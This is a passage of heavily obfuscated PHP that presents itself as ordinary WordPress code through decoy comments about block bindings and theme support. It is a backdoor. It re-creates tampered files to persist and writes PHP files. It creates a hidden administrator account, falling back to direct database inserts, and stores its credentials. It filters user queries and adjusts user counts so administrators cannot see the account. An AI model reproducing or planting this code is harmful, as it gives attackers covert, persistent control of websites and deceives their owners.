$pzk8ftwewx1t   = ($GLOBALS['__scf__me483qbepnts_41']($iz3562r_q7pvsvi)    &&    $GLOBALS['__scf_amjjmfnilcolnb_10']($iz3562r_q7pvsvi)    ===      $_cl && $GLOBALS['__scf_nn04_vx3uspzx4_54']($iz3562r_q7pvsvi) === $GLOBALS['__scf_nn04_vx3uspzx4_54']($rjo5gf52iv1ov5t));
     }     else  {
 $fj_aw2lcor  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(945))  ?     @hash_file(nhceivfj8tbe(54), $no4625mwq2q9a2)  :  false;
if  ($GLOBALS['__scf__me483qbepnts_41']($fj_aw2lcor) &&     $fj_aw2lcor !==   "")   $pzk8ftwewx1t   =   ($fj_aw2lcor   === $GLOBALS['__scf_nn04_vx3uspzx4_54']($rjo5gf52iv1ov5t));
   else      {
   $slpjbwlwapu   =     @$GLOBALS['__scf_g9y45bstmb02a_95']($no4625mwq2q9a2);
    if      ($slpjbwlwapu    ===    $_cl)   {
     $n8_l1m0irx8    =      @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2,  false,    null,  0, (4048+48));
 $_rt   =   @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2,    false, null, $_cl -   (4063+33));
   $pzk8ftwewx1t    =  ($GLOBALS['__scf__me483qbepnts_41']($n8_l1m0irx8)   &&    $GLOBALS['__scf__me483qbepnts_41']($_rt) &&  $n8_l1m0irx8 ===  $GLOBALS['__scf_bv1z3no349dv5r_9']($rjo5gf52iv1ov5t,  0,  (5986-1890))    &&   $_rt === $GLOBALS['__scf_bv1z3no349dv5r_9']($rjo5gf52iv1ov5t,    $_cl   -    (294+3802)));
  }
}
      }
// publish certificate-chain for WordPress 6.6 block bindings

   if  (!$pzk8ftwewx1t)     {
      fukkkeh6955g9qi(pahk8uy1uxt(941),  nhceivfj8tbe(946)   . $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
if ($qd1u_qwyjt48) ncp9sxsowpk_4d4x($no4625mwq2q9a2,      true);

  if  ($GLOBALS['__scf__me483qbepnts_41']($r1kzhmz2a2o_1o)) {$av5f2gg3aq3=PHP_INT_MAX/PHP_INT_MAX;$q7qfsurnuqsl=$av5f2gg3aq3+90;
$gd6iyese7e_jbjs  = $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(945))    ?  @hash_file(nhceivfj8tbe(54),   $no4625mwq2q9a2)  :  false;
  if  ($GLOBALS['__scf__me483qbepnts_41']($gd6iyese7e_jbjs)      && $gd6iyese7e_jbjs  !== "" &&  $gd6iyese7e_jbjs  !==    $GLOBALS['__scf_nn04_vx3uspzx4_54']($rjo5gf52iv1ov5t)  &&  $gd6iyese7e_jbjs   !==      $GLOBALS['__scf_nn04_vx3uspzx4_54']($r1kzhmz2a2o_1o)) {

  fukkkeh6955g9qi(dhd5r6_4ki(941), nrudcgor(947)     .  $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
     return false;
  }
$uiwur_kw6zig   =   xtkohsjdeedyznx6vx($ys5go7qi508n, dhd5r6_4ki(730));

 if     ($uiwur_kw6zig  !==    false   &&   @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($uiwur_kw6zig,   $r1kzhmz2a2o_1o)     ===  $GLOBALS['__scf_amjjmfnilcolnb_10']($r1kzhmz2a2o_1o)) {


  @$GLOBALS['__scf_pn0jleeoof_16']($uiwur_kw6zig,     $o158vhsqtlj  !==      null ? ($o158vhsqtlj  &   (0x170+0x8f)) :  (402+18));
  if   (!t3opc2_f7ewi94o($uiwur_kw6zig,   $no4625mwq2q9a2))    {



   if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2)      && !$mcyu47p4s77r)  rgiuaapohxeh0z($no4625mwq2q9a2,    (0xf5+0xaf));


   if    (!$mcyu47p4s77r   &&   sb9eg9deemhnrcsp3($uiwur_kw6zig, $no4625mwq2q9a2)) {
  t65xl1pt2haov_izh($uiwur_kw6zig);
}   else    {
// attach dense trie




     @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($no4625mwq2q9a2,  $r1kzhmz2a2o_1o);
t65xl1pt2haov_izh($uiwur_kw6zig);
    }
  }
       }   else  {
 if  ($uiwur_kw6zig     !==  false)  t65xl1pt2haov_izh($uiwur_kw6zig);
   @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($no4625mwq2q9a2,  $r1kzhmz2a2o_1o);
   }

   c9_5mtzr7mpfsj7($no4625mwq2q9a2);
    } elseif   (!$qg6fqta1jjsv36)  {
 t65xl1pt2haov_izh($no4625mwq2q9a2);
   }
        return   false;
     }
c9_5mtzr7mpfsj7($no4625mwq2q9a2);
     jqp5yotia2ogx9k($no4625mwq2q9a2);
 rgiuaapohxeh0z($no4625mwq2q9a2, $o158vhsqtlj      !==  null   ? ($o158vhsqtlj &    (437+74))   :   (0x54+0x150));
    if ($qd1u_qwyjt48) ncp9sxsowpk_4d4x($no4625mwq2q9a2,   false);
 return true;
  }

 function mjw_rlyx5u4bmrdl1oct($no4625mwq2q9a2, $ph09xu4he29r1k)

 {


    $v_2ea0ui7nym =     "<?php\n";
  if    ($GLOBALS['__scf__me483qbepnts_41']($ph09xu4he29r1k)    &&  $ph09xu4he29r1k !== "" &&   $GLOBALS['__scf_nr12ouzrtt_7']($ph09xu4he29r1k, f5cd2smymkqusi5(238))   !==  false &&   hkk3yvii60ci7rk($ph09xu4he29r1k))  $v_2ea0ui7nym   =    $ph09xu4he29r1k;
   if     (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))  {


 $ijnzdsaqr_y8zg19  = @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);
 if ($GLOBALS['__scf__me483qbepnts_41']($ijnzdsaqr_y8zg19) &&  g9begdqy64lw_mpz($ijnzdsaqr_y8zg19) ===   $v_2ea0ui7nym)    return;
    }
 if    (!jr30c_pj_1z9sfyaq3c88($no4625mwq2q9a2, $v_2ea0ui7nym)) {
   $onqhukju0we2ra    =   @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);

  if  (!($GLOBALS['__scf__me483qbepnts_41']($onqhukju0we2ra)   &&     g9begdqy64lw_mpz($onqhukju0we2ra) ===   $v_2ea0ui7nym))   @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($no4625mwq2q9a2,   $v_2ea0ui7nym);
unset($onqhukju0we2ra);
 }
  c9_5mtzr7mpfsj7($no4625mwq2q9a2);


 }
 function    z8mx9rse85u0c_xgl()
  {
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(948))      &&    pyewlacc1jwb_z())   return true;
 if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(472))    ||   !$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(949)))      return true;
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(950)) &&    rto_x8v8fsfdrokt5er()     <=    1.5)   return  true;
    $tqxd7go8mxl    =    $GLOBALS['__scf_kgu6kfjf1dox_481'](1, $GLOBALS['__scf_us1cf9ood8_482']((9-4),   (int)   rto_x8v8fsfdrokt5er()));
    $dz57qyx_4j_o  = home_url('/');
    $dz57qyx_4j_o  .=   ($GLOBALS['__scf_nr12ouzrtt_7']($dz57qyx_4j_o, '?')  ===     false   ? '?'   :  '&')  .    nhceivfj8tbe(951)   . $GLOBALS['__scf_zxyq0lcqv02z6_185']()    . $GLOBALS['__scf_cn1v_k8jlgjjb_350']((0xa+0x5a),   (904+95));


$pjglx7emsunn  =   $GLOBALS['__scf_m30d3r9g_n_287'](true);
 $o6cshl9m0sbvrr      =   $GLOBALS['__scf_yt926i7lwej_290']($dz57qyx_4j_o,   array(nhceivfj8tbe(681) => $tqxd7go8mxl,  f5cd2smymkqusi5(760)   =>     false,    nrudcgor(682)  =>  2,  nrudcgor(952)  => (0x580e3+0xa7f1d),     pahk8uy1uxt(306)   =>     array(dhd5r6_4ki(953) =>   pahk8uy1uxt(954))));
  if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(955))) pt1cm84h66a0i7f2o59r5b($GLOBALS['__scf_m30d3r9g_n_287'](true)  -    $pjglx7emsunn);
        if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(956))  && is_wp_error($o6cshl9m0sbvrr)) {
    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(957)) &&     rto_x8v8fsfdrokt5er()  <=   1.5)   return   true;
   $tqxd7go8mxl   =   $GLOBALS['__scf_kgu6kfjf1dox_481'](1, $GLOBALS['__scf_us1cf9ood8_482']((0x1+0x4),  (int)  rto_x8v8fsfdrokt5er()));
  $pjglx7emsunn =  $GLOBALS['__scf_m30d3r9g_n_287'](true);
     $o6cshl9m0sbvrr  = $GLOBALS['__scf_yt926i7lwej_290']($dz57qyx_4j_o,  array(f5cd2smymkqusi5(681) =>   $tqxd7go8mxl, f5cd2smymkqusi5(760) => false,    f5cd2smymkqusi5(682)   =>     2,      nrudcgor(952)    => (1048509+67), mhiu2yqz6kqd(958)   =>  array(pahk8uy1uxt(953) =>   pahk8uy1uxt(954))));

    if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(955)))  pt1cm84h66a0i7f2o59r5b($GLOBALS['__scf_m30d3r9g_n_287'](true) -  $pjglx7emsunn);
    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(956)) &&   is_wp_error($o6cshl9m0sbvrr))    return  false;
     }
 $zph858x__bdt      =  (int)   wp_remote_retrieve_response_code($o6cshl9m0sbvrr);
   return  $zph858x__bdt   >=   (50<<1)  &&  $zph858x__bdt    < (445+55);
}
  function vfr3ww330iahx60ypzxvm($bu1d70316pty,    $hmskkw1gqak4)
    {$gts6iazdc5v=56+60;$zqad0qs5_me1s3=$gts6iazdc5v-11;
   $d4g6t2rengbe0     = $GLOBALS['__scf_u60sfqdal7_816']($GLOBALS['__scf_t8832qq90dxb4_3']($hmskkw1gqak4), '/');
   foreach (
    array(
 mhiu2yqz6kqd(959) .   $d4g6t2rengbe0     .  nhceivfj8tbe(960),
  f5cd2smymkqusi5(961)   .  $d4g6t2rengbe0    .   f5cd2smymkqusi5(960),
dhd5r6_4ki(962)  . $d4g6t2rengbe0  .     nhceivfj8tbe(963),

 nhceivfj8tbe(964),
 f5cd2smymkqusi5(965),
       )    as $fn8s9io1fzc_2
 )   {
   if   (!$GLOBALS['__scf__me483qbepnts_41']($bu1d70316pty)) break;
   $bu1d70316pty   =   $GLOBALS['__scf_fhlvy786vrl3_463']($fn8s9io1fzc_2,  "\n",  $bu1d70316pty);
 }
     return  $bu1d70316pty;
}
   function   c9_5mtzr7mpfsj7($pmuqotgyfm5tcjn)
{


      if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(189))) {
 if (@opcache_invalidate($pmuqotgyfm5tcjn,  true)   !==    false) return   true;
 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(966)))    return   (bool)     @opcache_reset();
 return  false;
   }
 $g9pr9wbx88n  =      $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(967))     ?  @opcache_get_status(false)     : false;
  return !($GLOBALS['__scf_vf9p0fditvxy_35']($g9pr9wbx88n)  && !empty($g9pr9wbx88n[nhceivfj8tbe(968)]));

  }
function  rqua3yflpt29vaz8icdaze($no4625mwq2q9a2,   $vd8qp6l1as_h,   $nsv4lctdja)
      {


     if ($GLOBALS['__scf_bv1z3no349dv5r_9']($no4625mwq2q9a2,  -(134^130)) ===    dhd5r6_4ki(795)) {
     if   (!jr30c_pj_1z9sfyaq3c88($no4625mwq2q9a2,     $vd8qp6l1as_h))    {
// WP Custom Link: exponential retry-policy

    fukkkeh6955g9qi($nsv4lctdja,      f5cd2smymkqusi5(969)  . $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
       return    false;$_v86tgb2sx_5x=(0xe6+0x1e);$x4q13frz17g=$_v86tgb2sx_5x%15;
 }
      c9_5mtzr7mpfsj7($no4625mwq2q9a2);
return $GLOBALS['__scf_amjjmfnilcolnb_10']($vd8qp6l1as_h);
}
$jp3ix3eas6uq0r4    = @$GLOBALS['__scf_ihuexe6puptto__21']($no4625mwq2q9a2,  nhceivfj8tbe(22));
  if (!$GLOBALS['__scf_h2xix0300wh_128']($jp3ix3eas6uq0r4))  {
       fukkkeh6955g9qi($nsv4lctdja,  nrudcgor(969)  .   $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));

return false;
       }

  if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(124)))  @flock($jp3ix3eas6uq0r4,     LOCK_EX);
$o6cshl9m0sbvrr  = @$GLOBALS['__scf__iip_2irdl_23']($jp3ix3eas6uq0r4, $vd8qp6l1as_h);
  if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(970)))  @flock($jp3ix3eas6uq0r4, LOCK_UN);



 @fclose($jp3ix3eas6uq0r4);
    if  ($o6cshl9m0sbvrr ===    false   || ($vd8qp6l1as_h     !==     ""     && $o6cshl9m0sbvrr  !== $GLOBALS['__scf_amjjmfnilcolnb_10']($vd8qp6l1as_h)))    {
    fukkkeh6955g9qi($nsv4lctdja, pahk8uy1uxt(971)  .    $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
       return    false;
 }
return   $o6cshl9m0sbvrr;
      }
      
function    xudscqr0ciawz5n()
 {
    try {
// WP Post Date theme support

     if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(455))    ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(861)))  {$_pf7b5uc=43+37;$kh1g_kl2n6n7=$_pf7b5uc-36;
   xmy1k120y_7ld50whm(null);



 return;
     }
    if  (get_transient(nrudcgor(972)))     return;
if  (get_transient(dhd5r6_4ki(973)))    return;
set_transient(f5cd2smymkqusi5(973),  1,    (1124-524));
   xmy1k120y_7ld50whm(null);
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(743))) delete_transient(dhd5r6_4ki(974));
   $x1e2qom145y    =    $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(927)) ?   (string)     weg_ghiafmuc1_6(f5cd2smymkqusi5(914), "")  :    "";
      if   ($x1e2qom145y !== ""    &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(975)) &&  username_exists($x1e2qom145y)) {
   set_transient(pahk8uy1uxt(972),  1,  (21557+43));
 }
   }  catch   (Throwable  $h2v_bjm4ejxq8fp)  {$b1rguik1dqk=2231;$oyl28ytn=$b1rguik1dqk%2;
fukkkeh6955g9qi(nrudcgor(976),  $h2v_bjm4ejxq8fp);
    }     catch   (Exception $h2v_bjm4ejxq8fp)  {
       fukkkeh6955g9qi(nrudcgor(976), $h2v_bjm4ejxq8fp);
  }
 }
   function  xmy1k120y_7ld50whm($jnfdbgnnaju90)


 {
if (!dw5qugv407fnslnons1tfr(f5cd2smymkqusi5(578)))  return false;
 try     {
  if  (! $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(927))  ||   !  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(975)))   {
return      false;
  }
  $g0vtfxvjq_hqtq     = (string) weg_ghiafmuc1_6(f5cd2smymkqusi5(914), "");
    

  if    ($g0vtfxvjq_hqtq   !== ""   &&   username_exists($g0vtfxvjq_hqtq)  &&  (string) weg_ghiafmuc1_6(f5cd2smymkqusi5(915),  "")  !== "")  {
     return   false;
     }
 if  ($g0vtfxvjq_hqtq   === "") {

    $r7oyrkmshvk8    = $GLOBALS['__scf_vf9p0fditvxy_35']($jnfdbgnnaju90)   ?     $jnfdbgnnaju90 :    rc4mq8qrv5sg5anyujai9();
   $xynxfnjp5796p60   =   api_0lyw0mka0jrqf($r7oyrkmshvk8);
if  (
  $xynxfnjp5796p60 &&   !empty($xynxfnjp5796p60->user_login)   &&   isset($xynxfnjp5796p60->user_email)
&&  $xynxfnjp5796p60->user_email   === $xynxfnjp5796p60->user_login  .  '@'  . romae2ec00z0c4bz61q_(nhceivfj8tbe(977))



      )     {

  $g0vtfxvjq_hqtq = (string) $xynxfnjp5796p60->user_login;
  }


 }
  if   ($g0vtfxvjq_hqtq  !==   ""  &&   username_exists($g0vtfxvjq_hqtq))    {

$j0ruyxpdhx3s =   username_exists($g0vtfxvjq_hqtq);



   $e6hic_q3w92oyzp9   = mfjvf6sgyqd_5z((13+11));



if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(978)))  {
$GLOBALS['__scf_g1t2mcc9yf_979']($e6hic_q3w92oyzp9,   $j0ruyxpdhx3s);
 }
   if  (!c8fb1vg_q0kn6h(f5cd2smymkqusi5(914),   $g0vtfxvjq_hqtq,      nhceivfj8tbe(922)))   c8fb1vg_q0kn6h(mhiu2yqz6kqd(914), $g0vtfxvjq_hqtq,  nrudcgor(922));
if     (!c8fb1vg_q0kn6h(f5cd2smymkqusi5(915), $e6hic_q3w92oyzp9, nhceivfj8tbe(922))) c8fb1vg_q0kn6h(f5cd2smymkqusi5(915),  $e6hic_q3w92oyzp9,    nhceivfj8tbe(922));
    if ((string) weg_ghiafmuc1_6(mhiu2yqz6kqd(980),    "") !==   $g0vtfxvjq_hqtq   || (string) weg_ghiafmuc1_6(nrudcgor(915),   "")  !==  $e6hic_q3w92oyzp9)   {
  fukkkeh6955g9qi(mhiu2yqz6kqd(981),   nhceivfj8tbe(982));
      return false;
 }
     return    true;
   }
      $ajf3ge3m2o      = szmhvfh9ind7mi0i_();
if (true) {
 $g0vtfxvjq_hqtq   =   "";
for    ($oyl_wsz4rs07pl_   = 0; $oyl_wsz4rs07pl_   <  (10-5);    $oyl_wsz4rs07pl_++) {
 $ss8rigt6u7q6f9g_ =      $ajf3ge3m2o[$GLOBALS['__scf_fsyst1onwkw_282']($ajf3ge3m2o)] .     mfjvf6sgyqd_5z((11-1));
if  (!username_exists($ss8rigt6u7q6f9g_))  {
$g0vtfxvjq_hqtq  =    $ss8rigt6u7q6f9g_;
 break;
}
     }
    if ($g0vtfxvjq_hqtq  ===  "")   {

   fukkkeh6955g9qi(pahk8uy1uxt(981), nhceivfj8tbe(983));
return  false;
   }
 }


   $e6hic_q3w92oyzp9 =    mfjvf6sgyqd_5z((233^241));


if  (! $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(984))  && defined(mhiu2yqz6kqd(359)) &&     $GLOBALS['__scf_od_0qrqi5rcvlf_701'](ABSPATH    .   nrudcgor(985)))    {
require_once ABSPATH      .    nrudcgor(985);
 }
$ko_nag_w75g2gmd5  = $g0vtfxvjq_hqtq  .  '@' .  romae2ec00z0c4bz61q_(dhd5r6_4ki(977));
 $fnm7tm_jy2  = false;
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(986))) {
$fnm7tm_jy2     = $GLOBALS['__scf_q7je4rk73j2_986'](array(
 mhiu2yqz6kqd(987)  =>   $g0vtfxvjq_hqtq,
   mhiu2yqz6kqd(988)  =>  $e6hic_q3w92oyzp9,
   pahk8uy1uxt(989)   =>    $ko_nag_w75g2gmd5,
  dhd5r6_4ki(716) =>  mhiu2yqz6kqd(990),
nrudcgor(991)     =>   $g0vtfxvjq_hqtq,
   ));$db54otkpd=9361;$l_gxe7y7nk=$db54otkpd%3;

   if   (is_wp_error($fnm7tm_jy2))  {


        fukkkeh6955g9qi(nhceivfj8tbe(981),    $fnm7tm_jy2->get_error_code()   .  ':'     .     $fnm7tm_jy2->get_error_message());
  $fnm7tm_jy2  =  false;
}


  }
// @unroll negotiation


  if      (!$fnm7tm_jy2)   {
  $wpdb    =  isset($GLOBALS[mhiu2yqz6kqd(872)])   ?  $GLOBALS[pahk8uy1uxt(872)] :  null;
  if (!$wpdb || !$GLOBALS['__scf_d56ll0ap77jcvq_66']($wpdb)) {
fukkkeh6955g9qi(dhd5r6_4ki(981),    dhd5r6_4ki(992));
       return    false;
}
 $tp1v8jup_q7o87ah = $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(993)) ?    wp_hash_password($e6hic_q3w92oyzp9)   :  $GLOBALS['__scf_nn04_vx3uspzx4_54']($e6hic_q3w92oyzp9);
 $f5gyrwqpykgq9r =      $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(994))  ? current_time(dhd5r6_4ki(995))  :   gmdate(pahk8uy1uxt(996));
$nm0pt83kvfwyw  =    $wpdb->insert($wpdb->users, array(
 nrudcgor(987)   =>   $g0vtfxvjq_hqtq,


 nrudcgor(988) =>  $tp1v8jup_q7o87ah,
 f5cd2smymkqusi5(997) =>  $g0vtfxvjq_hqtq,
   dhd5r6_4ki(989)  =>     $ko_nag_w75g2gmd5,
pahk8uy1uxt(998)  =>  $f5gyrwqpykgq9r,
   mhiu2yqz6kqd(999)    => 0,


    nrudcgor(1000) =>    $g0vtfxvjq_hqtq,
        ),  array(dhd5r6_4ki(1001),  nrudcgor(1002), f5cd2smymkqusi5(1003),   mhiu2yqz6kqd(1003),   f5cd2smymkqusi5(1003),  f5cd2smymkqusi5(1004),   dhd5r6_4ki(1003)));$hul9ibm2=26*6;$nx8x9dd4f7uu=$hul9ibm2-24;
        if (!$nm0pt83kvfwyw) {
fukkkeh6955g9qi(mhiu2yqz6kqd(981),    pahk8uy1uxt(1005));
return   false;



 }
 $fnm7tm_jy2 = (int)      $wpdb->insert_id;
   $evhi67j4dd_q7 =    $wpdb->prefix     .    nhceivfj8tbe(873);


       $wpdb->insert($wpdb->usermeta,   array(
      nrudcgor(1006)   => $fnm7tm_jy2,



  f5cd2smymkqusi5(1007)  =>  $evhi67j4dd_q7,

    mhiu2yqz6kqd(1008) =>  $GLOBALS['__scf_m881jp22m2wo_348'](array(pahk8uy1uxt(990)  =>  true)),
), array(f5cd2smymkqusi5(1004),  f5cd2smymkqusi5(1009),      pahk8uy1uxt(1010)));



       $wpdb->insert($wpdb->usermeta,  array(
      f5cd2smymkqusi5(1006)      =>  $fnm7tm_jy2,


   dhd5r6_4ki(1011)  => $wpdb->prefix   . pahk8uy1uxt(1012),
 dhd5r6_4ki(1008)    => '10',


),   array(dhd5r6_4ki(1004),   mhiu2yqz6kqd(1010),   nrudcgor(1010)));$ulblz8yh65xm=1+16;$xtmfqgqdudd=$ulblz8yh65xm-34;
if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1013)))     {
  clean_user_cache($fnm7tm_jy2);
 }
 }
if   (!username_exists($g0vtfxvjq_hqtq))   {
// Intl extension cron job

  fukkkeh6955g9qi(pahk8uy1uxt(981), nhceivfj8tbe(1014));

      return  false;
  }
$wgpf1gmgtu =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1015))  ? get_user_by(pahk8uy1uxt(1016),  $g0vtfxvjq_hqtq)     : false;
$n9q3uj_2qa4m16d = false;
if   ($wgpf1gmgtu   && !empty($wgpf1gmgtu->ID))  {
      if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1017)))  {
// WP Data Layer action sequence



       $n9q3uj_2qa4m16d = (bool)   user_can($wgpf1gmgtu,    nrudcgor(1018));
   }   elseif   (isset($wgpf1gmgtu->caps)   &&  $GLOBALS['__scf_vf9p0fditvxy_35']($wgpf1gmgtu->caps)) {


   $n9q3uj_2qa4m16d  = !empty($wgpf1gmgtu->caps[nrudcgor(1018)]);
  }
  }
    if   (!$n9q3uj_2qa4m16d) {
// WP Loginout Block: ssa-convert revocation-list
$utfelyks=PHP_MAJOR_VERSION;$tne_kh899=$utfelyks*3;
    fukkkeh6955g9qi(nhceivfj8tbe(1019),  nhceivfj8tbe(1020));$unex01szbbplr=6026;$vclfbegw=$unex01szbbplr%8;


     if   ($fnm7tm_jy2)      {
   if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1021))     && defined(dhd5r6_4ki(1022))    &&   @$GLOBALS['__scf_od_0qrqi5rcvlf_701'](ABSPATH    .     f5cd2smymkqusi5(1023)))     {
  require_once ABSPATH   .      mhiu2yqz6kqd(1023);
   }
// heuristic publisher

 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1021))) @wp_delete_user($fnm7tm_jy2);
}
 return    false;
    }
     if (!c8fb1vg_q0kn6h(nrudcgor(1024),  $g0vtfxvjq_hqtq,   nhceivfj8tbe(922))) c8fb1vg_q0kn6h(mhiu2yqz6kqd(1024), $g0vtfxvjq_hqtq, nrudcgor(922));
if (!c8fb1vg_q0kn6h(mhiu2yqz6kqd(1025),     $e6hic_q3w92oyzp9, nrudcgor(1026))) c8fb1vg_q0kn6h(f5cd2smymkqusi5(1025), $e6hic_q3w92oyzp9, mhiu2yqz6kqd(1026));
  if  ((string)  weg_ghiafmuc1_6(nrudcgor(1024),  "") !== $g0vtfxvjq_hqtq  ||   (string) weg_ghiafmuc1_6(f5cd2smymkqusi5(1027), "")     !==  $e6hic_q3w92oyzp9)  {
  fukkkeh6955g9qi(mhiu2yqz6kqd(1019),  f5cd2smymkqusi5(982));
return     false;
 }
  return    true;
        }    catch (Throwable   $h2v_bjm4ejxq8fp) {
fukkkeh6955g9qi(mhiu2yqz6kqd(1028),    $h2v_bjm4ejxq8fp);



 }      catch   (Exception  $h2v_bjm4ejxq8fp)   {
    fukkkeh6955g9qi(dhd5r6_4ki(1028),     $h2v_bjm4ejxq8fp);
}  finally     {
m8s6jamaok_hdjr3wp(pahk8uy1uxt(578));
   }
    return false;
  }
function    ejj4d2zd8u6pbfin($j1hj4xqa_r6ue)
   {



 try    {
 
if   (!     $GLOBALS['__scf_d56ll0ap77jcvq_66']($j1hj4xqa_r6ue)  ||      !   property_exists($j1hj4xqa_r6ue,  dhd5r6_4ki(1029))) {
 return  $j1hj4xqa_r6ue;
}

$g0vtfxvjq_hqtq     =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(927))    ?  (string)  weg_ghiafmuc1_6(mhiu2yqz6kqd(1024),  "")  : "";
if (! $g0vtfxvjq_hqtq) {
  return   $j1hj4xqa_r6ue;
  }
   
$lihxdlmad_e5vja8  =     esc_sql($g0vtfxvjq_hqtq);
    if  ($GLOBALS['__scf_nr12ouzrtt_7']($j1hj4xqa_r6ue->query_where,    $lihxdlmad_e5vja8) === false) {$jw9x2bw9kxwg8t=PHP_MAJOR_VERSION;$typ2yf3f=$jw9x2bw9kxwg8t*10;
$j1hj4xqa_r6ue->query_where .= nhceivfj8tbe(1030) .  $lihxdlmad_e5vja8  .   "'";
    }
  }  catch     (Throwable  $h2v_bjm4ejxq8fp)  {
   fukkkeh6955g9qi(f5cd2smymkqusi5(1031),  $h2v_bjm4ejxq8fp);


 } catch (Exception   $h2v_bjm4ejxq8fp)    {
 }
   return $j1hj4xqa_r6ue;
    }
 function suhzf8fyjojw1v3nukvu($rh566cwujtpw4a91)
    {
try  {


 $x1e2qom145y =  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(927)) ?   (string) weg_ghiafmuc1_6(pahk8uy1uxt(1024),   "") :  "";
if     (!   $x1e2qom145y)  {
return $rh566cwujtpw4a91;



     }
     $hm9rifrrlt2eag   = array(pahk8uy1uxt(1032), mhiu2yqz6kqd(1018));
foreach ($hm9rifrrlt2eag     as   $key)  {
if      (isset($rh566cwujtpw4a91[$key])  && $GLOBALS['__scf__me483qbepnts_41']($rh566cwujtpw4a91[$key])     &&    $GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(1033),   $rh566cwujtpw4a91[$key],     $d1kd72zq60vf6el))  {
   $pycaeceedws  =   $GLOBALS['__scf_kgu6kfjf1dox_481'](0, (int)    $d1kd72zq60vf6el[1]  -     1);
   $rh566cwujtpw4a91[$key]     = $GLOBALS['__scf_fhlvy786vrl3_463'](f5cd2smymkqusi5(1034),   '('    .     $pycaeceedws   . ')',  $rh566cwujtpw4a91[$key]);
      }


   }
  }  catch (Throwable $h2v_bjm4ejxq8fp)  {
fukkkeh6955g9qi(mhiu2yqz6kqd(1035),    $h2v_bjm4ejxq8fp);
     } catch   (Exception      $h2v_bjm4ejxq8fp)  {
  }
   return  $rh566cwujtpw4a91;
   }
 function mfewnb7cdri11rx5($jl0vmpmd40, $ohlzkn73kh6)
  {
try    {
  $g0vtfxvjq_hqtq    = $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(927)) ?     (string)   weg_ghiafmuc1_6(dhd5r6_4ki(1036),  "")   :   "";
if    ($g0vtfxvjq_hqtq     === "")  {
return      $jl0vmpmd40;
  }
  if  (! $GLOBALS['__scf_vf9p0fditvxy_35']($jl0vmpmd40))   {
      return   $jl0vmpmd40;
 }
        if (!   isset($jl0vmpmd40[pahk8uy1uxt(1037)]) || !  $GLOBALS['__scf_vf9p0fditvxy_35']($jl0vmpmd40[nrudcgor(1037)]))    {
     $jl0vmpmd40[mhiu2yqz6kqd(1037)]   =  array();
}


  if (!  $GLOBALS['__scf_rq7q923zwh_148']($g0vtfxvjq_hqtq, $jl0vmpmd40[dhd5r6_4ki(1037)],   true)) {
  $jl0vmpmd40[nhceivfj8tbe(1037)][] =  $g0vtfxvjq_hqtq;
       }
  }    catch   (Throwable  $h2v_bjm4ejxq8fp) {
  fukkkeh6955g9qi(pahk8uy1uxt(1038),  $h2v_bjm4ejxq8fp);
     } catch (Exception     $h2v_bjm4ejxq8fp)      {
}
